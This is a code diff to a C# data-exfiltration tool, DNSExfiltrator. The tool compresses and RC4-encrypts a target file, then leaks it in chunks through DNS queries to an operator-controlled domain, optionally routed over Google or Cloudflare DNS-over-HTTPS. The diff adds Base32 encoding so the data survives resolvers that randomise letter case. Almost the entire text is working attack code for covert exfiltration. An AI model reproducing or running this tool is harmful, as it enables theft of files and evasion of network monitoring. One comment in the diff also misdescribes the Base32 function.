@@ -43,10 +43,11 @@ namespace DNSExfiltrator
 		private static void PrintUsage()
 		{
 			Console.WriteLine("Usage:");
-			Console.WriteLine("{0} <file> <domainName> <password> [h=google|cloudflare] [s=<DNS_server>] [t=<throttleTime>] [r=<requestMaxSize>] [l=<labelMaxSize>]", System.AppDomain.CurrentDomain.FriendlyName);
+			Console.WriteLine("{0} <file> <domainName> <password> [-b32] [h=google|cloudflare] [s=<DNS_server>] [t=<throttleTime>] [r=<requestMaxSize>] [l=<labelMaxSize>]", System.AppDomain.CurrentDomain.FriendlyName);
 			Console.WriteLine("\tfile:\t\t[MANDATORY] The file name to the file to be exfiltrated.");
 			Console.WriteLine("\tdomainName:\t[MANDATORY] The domain name to use for DNS requests.");
 			Console.WriteLine("\tpassword:\t[MANDATORY] Password used to encrypt the data to be exfiltrated.");
+			Console.WriteLine("\t-b32:\t\t[OPTIONNAL] Use base32 encoding of data. Might be required by some DNS resolver which break case.");
 			Console.WriteLine("\th:\t\t[OPTIONNAL] Use Google or CloudFlare DoH (DNS over HTTP) servers.");
 			Console.WriteLine("\tDNS_Server:\t[OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.");
 			Console.WriteLine("\tthrottleTime:\t[OPTIONNAL] The time in milliseconds to wait between each DNS request.");
@@ -70,9 +71,9 @@ namespace DNSExfiltrator
 		}
 		
 		//------------------------------------------------------------------------------------
-		// Outputs to console with color
+		// Encodes a byte array of data into a base64url string
 		//------------------------------------------------------------------------------------
-		private static string Encode(byte[] data)
+		private static string ToBase64URL(byte[] data)
 		{
 			string result = String.Empty;
 			
@@ -81,6 +82,21 @@ namespace DNSExfiltrator
 			// '/' and '+' characters are substituded
 			// '=' padding character are removed and will need to be recomputed at the remote end
 			result = Convert.ToBase64String(data).Replace("=","").Replace("/","_").Replace("+","-");
+			return result;
+		}
+		
+		//------------------------------------------------------------------------------------
+		// Encodes a byte array of data into a base32 string
+		//------------------------------------------------------------------------------------
+		private static string ToBase32(byte[] data)
+		{
+			string result = String.Empty;
+			
+			// characters used in DNS names through the Win32 API resolution library do not
+			// support all of the base64 characters. We have to use the base64url standard:
+			// '/' and '+' characters are substituded
+			// '=' padding character are removed and will need to be recomputed at the remote end
+			result = Base32.ToBase32String(data).Replace("=","");
 			return result;
 		}
 		
@@ -107,13 +123,15 @@ namespace DNSExfiltrator
 		//------------------------------------------------------------------------------------
         public static void Main(string[] args)
         {
-			// Variables
+			// Mandatory parameters
 			string filePath = String.Empty;
 			string domainName = String.Empty;
 			string password = String.Empty;
 
+			// Optionnal parameters
 			string fileName = String.Empty;
-			bool useDoH = false; // Whether or not to use DoH for resolution
+			bool useBase32 = false; // Whether or not to use Base32 for data encoding
+			bool useDoH = false; // Whether or not to use DoH for name resolution
 			string dohProvider = String.Empty; // Which DoH server to use: google or cloudflare
 			string dnsServer = null;
 			int throttleTime = 0;
@@ -166,6 +184,7 @@ namespace DNSExfiltrator
 					else if (args[i].StartsWith("h=")) {
 						dohProvider = args[i].Split('=')[1];
 						if (dohProvider.Equals("google") || dohProvider.Equals("cloudflare")) {
+							if (dohProvider.Equals("cloudflare")) {useBase32 = true;} 
 							useDoH = true;
 							PrintColor("[*] Using DNS over HTTP for name resolution.");
 						}
@@ -174,6 +193,9 @@ namespace DNSExfiltrator
 							PrintUsage();
 							return;
 						}
+					}
+					else if (args[i] == "-b32") {
+						useBase32 = true;
 					}
 					i++;
 				}
@@ -195,8 +217,18 @@ namespace DNSExfiltrator
 				}
 
 				zipStream.Seek(0, SeekOrigin.Begin);
-				PrintColor(String.Format("[*] Encrypting the ZIP file with password [{0}], then converting it to a base64 representation",password));
-				data = Encode(RC4Encrypt.Encrypt(Encoding.UTF8.GetBytes(password),zipStream.ToArray()));
+				PrintColor(String.Format("[*] Encrypting the ZIP file with password [{0}]",password));
+				
+				// Should we use base32 encoding ? CloudFlare requires it because of Knot server doing case randomization which breaks base64
+				if (useBase32) {
+					PrintColor("[*] Encoding the data with Base32");
+					data = ToBase32(RC4Encrypt.Encrypt(Encoding.UTF8.GetBytes(password),zipStream.ToArray()));
+				}
+				else {
+					PrintColor("[*] Encoding the data with Base64URL");
+					data = ToBase64URL(RC4Encrypt.Encrypt(Encoding.UTF8.GetBytes(password),zipStream.ToArray()));
+				}
+				
 				PrintColor(String.Format("[*] Total size of data to be transmitted: [{0}] bytes", data.Length));
 			}
 			
@@ -216,8 +248,14 @@ namespace DNSExfiltrator
 			PrintColor(String.Format("[+] Number of chunks: [{0}]", nbChunks));
 			
 			//--------------------------------------------------------------
-			// Send the initial request advertising the fileName and the total number of chunks
-			request = "init." + Encode(Encoding.UTF8.GetBytes(String.Format("{0}|{1}",fileName, nbChunks))) + "." + domainName;
+			// Send the initial request advertising the fileName and the total number of chunks, with Base32 encoding in all cases
+			if (useBase32) {
+				request = "init." + ToBase32(Encoding.UTF8.GetBytes(String.Format("{0}|{1}",fileName, nbChunks))) + ".base32." + domainName;
+			}
+			else {
+				request = "init." + ToBase32(Encoding.UTF8.GetBytes(String.Format("{0}|{1}",fileName, nbChunks))) + ".base64." + domainName;
+			}
+			
 			PrintColor("[*] Sending 'init' request");
 
 			string reply = String.Empty;
@@ -701,5 +739,117 @@ namespace DNSExfiltrator
 			DNS_TYPE_WINSR = 0xFF02,
 			DNS_TYPE_NBSTAT = DNS_TYPE_WINSR
 		}
+    }
+	
+	//============================================================================================
+	// This class provides Base32 encoding
+	// http://scottless.com/blog/archive/2014/02/15/base32-encoder-and-decoder-in-c.aspx
+	//============================================================================================
+	internal sealed class Base32
+    {
+        /// <summary>
+        /// Size of the regular byte in bits
+        /// </summary>
+        private const int InByteSize = 8;
+
+        /// <summary>
+        /// Size of converted byte in bits
+        /// </summary>
+        private const int OutByteSize = 5;
+
+        /// <summary>
+        /// Alphabet
+        /// </summary>
+        private const string Base32Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+
+        /// <summary>
+        /// Convert byte array to Base32 format
+        /// </summary>
+        /// <param name="bytes">An array of bytes to convert to Base32 format</param>
+        /// <returns>Returns a string representing byte array</returns>
+        internal static string ToBase32String(byte[] bytes)
+        {
+            // Check if byte array is null
+            if (bytes == null)
+            {
+                return null;
+            }
+            // Check if empty
+            else if (bytes.Length == 0)
+            {
+                return string.Empty;
+            }
+
+            // Prepare container for the final value
+            StringBuilder builder = new StringBuilder(bytes.Length * InByteSize / OutByteSize);
+
+            // Position in the input buffer
+            int bytesPosition = 0;
+
+            // Offset inside a single byte that <bytesPosition> points to (from left to right)
+            // 0 - highest bit, 7 - lowest bit
+            int bytesSubPosition = 0;
+
+            // Byte to look up in the dictionary
+            byte outputBase32Byte = 0;
+
+            // The number of bits filled in the current output byte
+            int outputBase32BytePosition = 0;
+
+            // Iterate through input buffer until we reach past the end of it
+            while (bytesPosition < bytes.Length)
+            {
+                // Calculate the number of bits we can extract out of current input byte to fill missing bits in the output byte
+                int bitsAvailableInByte = Math.Min(InByteSize - bytesSubPosition, OutByteSize - outputBase32BytePosition);
+
+                // Make space in the output byte
+                outputBase32Byte <<= bitsAvailableInByte;
+
+                // Extract the part of the input byte and move it to the output byte
+                outputBase32Byte |= (byte)(bytes[bytesPosition] >> (InByteSize - (bytesSubPosition + bitsAvailableInByte)));
+
+                // Update current sub-byte position
+                bytesSubPosition += bitsAvailableInByte;
+
+                // Check overflow
+                if (bytesSubPosition >= InByteSize)
+                {
+                    // Move to the next byte
+                    bytesPosition++;
+                    bytesSubPosition = 0;
+                }
+
+                // Update current base32 byte completion
+                outputBase32BytePosition += bitsAvailableInByte;
+
+                // Check overflow or end of input array
+                if (outputBase32BytePosition >= OutByteSize)
+                {
+                    // Drop the overflow bits
+                    outputBase32Byte &= 0x1F;  // 0x1F = 00011111 in binary
+
+                    // Add current Base32 byte and convert it to character
+                    builder.Append(Base32Alphabet[outputBase32Byte]);
+
+                    // Move to the next byte
+                    outputBase32BytePosition = 0;
+                }
+            }
+
+            // Check if we have a remainder
+            if (outputBase32BytePosition > 0)
+            {
+                // Move to the right bits
+                outputBase32Byte <<= (OutByteSize - outputBase32BytePosition);
+
+                // Drop the overflow bits
+                outputBase32Byte &= 0x1F;  // 0x1F = 00011111 in binary
+
+                // Add current Base32 byte and convert it to character
+                builder.Append(Base32Alphabet[outputBase32Byte]);
+            }
+
+            return builder.ToString();
+        }
     }
 }
